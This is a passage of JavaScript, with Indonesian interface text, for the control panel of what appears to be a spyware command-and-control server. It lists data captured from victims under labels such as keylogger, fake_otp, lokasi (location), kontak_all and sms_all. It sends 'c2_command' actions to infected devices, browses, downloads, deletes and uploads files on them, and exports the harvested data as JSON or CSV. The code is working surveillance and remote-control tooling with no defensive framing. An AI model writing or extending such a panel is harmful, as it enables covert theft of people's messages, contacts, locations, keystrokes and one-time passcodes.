    var html = '<div style="font-size:10px;color:var(--text-secondary);">Total: '+data.length+'</div><table><tr>';
    cols.forEach(function(c){ html += '<th>'+c+'</th>'; });
    html += '</tr>';
    var max = Math.min(data.length, limit||50);
    for(var i=0; i<max; i++){
        html += '<tr>';
        cols.forEach(function(c){
            var val = data[i][c] !== undefined ? data[i][c] : '?';
            if(typeof val === 'object') val = JSON.stringify(val);
            html += '<td>'+escapeHtml(String(val))+'</td>';
        });
        html += '</tr>';
    }
    html += '</table>';
    if(data.length > max) html += '<div style="color:var(--text-secondary);font-size:10px;">... dan '+(data.length-max)+' lainnya</div>';
    return html;
}

// ============================================================
// 🔥 LOG
// ============================================================
function renderLog() {
    try {
        var container = document.getElementById('logContainer');
        var search = document.getElementById('logSearch').value.toLowerCase();
        var filter = document.getElementById('logFilter').value;
        
        var filtered = allData.filter(function(item){
            if(filter && item.sumber !== filter) return false;
            if(search) {
                var json = JSON.stringify(item).toLowerCase();
                if(!json.includes(search)) return false;
            }
            return true;
        });
        
        document.getElementById('logCount').textContent = filtered.length + ' entries';
        
        var sources = {}; allData.forEach(function(i){ sources[i.sumber]=true; });
        var sel = document.getElementById('logFilter');
        var current = sel.value;
        sel.innerHTML = '<option value="">Semua</option>';
        Object.keys(sources).sort().forEach(function(s){ sel.innerHTML += '<option value="'+s+'">'+s+'</option>'; });
        sel.value = current;
        
        if(!filtered.length) { container.innerHTML = '<div class="empty">📭 Tidak ada data</div>'; return; }
        
        var html = '';
        filtered.slice(-200).reverse().forEach(function(item){
            var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
            var src = item.sumber || '?';
            var dataStr = '';
            try { dataStr = JSON.stringify(item.data).substring(0, 300); } catch(e){ dataStr = String(item.data).substring(0,300); }
            var cls = '';
            if(['keylogger','keylogger_ws'].includes(src)) cls = 'log-keylogger';
            else if(src === 'fake_otp') cls = 'log-otp';
            else if(src === 'lokasi') cls = 'log-location';
            else if(src === 'kontak_all') cls = 'log-contact';
            else if(src === 'sms_all') cls = 'log-sms';
            else if(src === 'c2_result') cls = 'log-c2';
            html += '<div class="log-item '+cls+'"><div class="time">'+waktu+'</div><div class="sumber">'+src+'</div><div class="data">'+escapeHtml(dataStr)+'</div></div>';
        });
        container.innerHTML = html;
    } catch(e) {
        document.getElementById('logContainer').innerHTML = '<div class="empty">Error: ' + e.message + '</div>';
    }
}

function resetFilter(){
    document.getElementById('logSearch').value = '';
    document.getElementById('logFilter').value = '';
    renderLog();
}

// ============================================================
// 🔥 C2 COMMAND
// ============================================================
function sendC2(aksi, params){
    if(!KEY){ showToast('Login dulu!'); return; }
    var payload = { sumber: 'c2_command', data: { aksi: aksi, ...(params||{}) } };
    c2History.push({ waktu: new Date().toISOString(), aksi: aksi, status: '⏳ Sending...' });
    renderC2History();
    document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
    document.getElementById('c2Result').style.color = '#ff0';
    fetch('/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
        .then(function(r){ return r.json(); })
        .then(function(res){
            document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
            document.getElementById('c2Result').style.color = '#0f0';
            var last = c2History[c2History.length-1];
            if(last){ last.status='✅ Success'; last.response=res; }
            renderC2History();
            showToast('✅ Command sent: '+aksi);
        })
        .catch(function(){
            document.getElementById('c2Result').textContent = '❌ Error: '+aksi;
            document.getElementById('c2Result').style.color = '#f44';
            var last = c2History[c2History.length-1];
            if(last){ last.status='❌ Failed'; }
            renderC2History();
        });
}

function sendC2Custom(){
    var input = document.getElementById('c2Custom').value.trim();
    if(!input){ showToast('Masukkan perintah!'); return; }
    try {
        var data = JSON.parse(input);
        var aksi = data.aksi || data.command || 'unknown';
        sendC2(aksi, data);
    } catch(e){ showToast('❌ Invalid JSON: '+e.message); }
}

function renderC2History(){
    try {
        var container = document.getElementById('c2History');
        if(!c2History.length){ container.innerHTML = '<div class="empty">Belum ada perintah</div>'; return; }
        var html = '<table><tr><th>Waktu</th><th>Perintah</th><th>Status</th></tr>';
        c2History.slice().reverse().forEach(function(item){
            var waktu = item.waktu ? new Date(item.waktu).toLocaleString('id-ID') : '?';
            var color = item.status.includes('✅') ? '#0f0' : (item.status.includes('❌') ? '#f44' : '#ff0');
            html += '<tr><td style="font-size:10px;">'+waktu+'</td><td>'+item.aksi+'</td><td style="color:'+color+';">'+item.status+'</td></tr>';
        });
        html += '</table>';
        container.innerHTML = html;
    } catch(e) {
        document.getElementById('c2History').innerHTML = '<div class="empty">Error: ' + e.message + '</div>';
    }
}

function exportJSON(){
    var blob = new Blob([JSON.stringify(allData,null,2)], {type:'application/json'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'data-'+Date.now()+'.json';
    a.click();
    showToast('📤 Export JSON berhasil!');
}

function exportCSV(){
    if(!allData.length){ showToast('Tidak ada data untuk diexport'); return; }
    var rows = [['Waktu','Sumber','Data']];
    allData.forEach(function(item){
        var waktu = item.waktu ? new Date(item.waktu).toISOString() : '';
        var sumber = item.sumber || '';
        var data = '';
        try { data = JSON.stringify(item.data).replace(/,/g,';').replace(/"/g,'""'); } catch(e){ data = String(item.data); }
        rows.push([waktu, sumber, data]);
    });
    var csv = rows.map(function(row){ return row.map(function(cell){ return '"'+cell+'"'; }).join(','); }).join('\n');
    var blob = new Blob([csv], {type:'text/csv;charset=utf-8'});
    var a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'data-'+Date.now()+'.csv';
    a.click();
    showToast('📊 Export CSV berhasil! ('+allData.length+' rows)');
}

function clearAll(){
    if(!confirm('⚠️ Hapus semua data?')) return;
    fetch('/clear?key='+encodeURIComponent(KEY), {method:'POST'})
        .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
        .catch(function(){ showToast('❌ Gagal hapus data'); });
}

// ============================================================
function listFiles(){
    var path = document.getElementById('filePath').value || '/';
    fetch('/api/files?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY))
        .then(function(r){ return r.json(); })
        .then(function(data){
            var container = document.getElementById('fileListContainer');
            if(!data || !data.length){
                container.innerHTML = '<div class="empty">📂 Kosong atau error</div>';
                return;
            }
            var html = '<div class="file-grid">';
            data.forEach(function(item){
                html += '<div class="file-item">';
                html += '<div class="name">'+(item.isDir ? '📁' : '📄')+' '+escapeHtml(item.name)+'</div>';
                html += '<div class="path">'+(item.size ? (item.size/1024).toFixed(1)+' KB' : '-')+'</div>';
                if(!item.isDir){
                    html += '<button class="btn-blue" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="downloadFile(\''+item.path+'\')">⬇️</button>';
                    html += '<button class="btn-red" style="font-size:8px;padding:2px 6px;margin-top:4px;" onclick="deleteFile(\''+item.path+'\')">🗑️</button>';
                }
                html += '</div>';
            });
            html += '</div>';
            container.innerHTML = html;
        })
        .catch(function(e){
            document.getElementById('fileListContainer').innerHTML = '<div class="empty">❌ Error: '+e.message+'</div>';
        });
}

function downloadFile(path){
    window.open('/api/download?path='+encodeURIComponent(path)+'&key='+encodeURIComponent(KEY), '_blank');
}

function deleteFile(path){
    if(!confirm('Hapus file: '+path+'?')) return;
    fetch('/api/delete', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({path: path, key: KEY})
    })
    .then(function(r){ return r.json(); })
    .then(function(res){
        showToast(res.status || 'Deleted');
        listFiles();
    })
    .catch(function(){ showToast('❌ Gagal hapus file'); });
}

function uploadFile(){
    document.getElementById('fileUpload').click();
}

function uploadFileSubmit(){
    var input = document.getElementById('fileUpload');
    var file = input.files[0];
    if(!file) return;
    var formData = new FormData();
    formData.append('file', file);
    formData.append('path', document.getElementById('filePath').value || '/');
    formData.append('key', KEY);
    fetch('/api/upload', {
        method: 'POST',
        body: formData
    })
    .then(function(r){ return r.json(); })
    .then(function(res){
        showToast('✅ Upload berhasil: '+file.name);
        listFiles();
        input.value = '';
    })
    .catch(function(){ showToast('❌ Gagal upload'); });
}
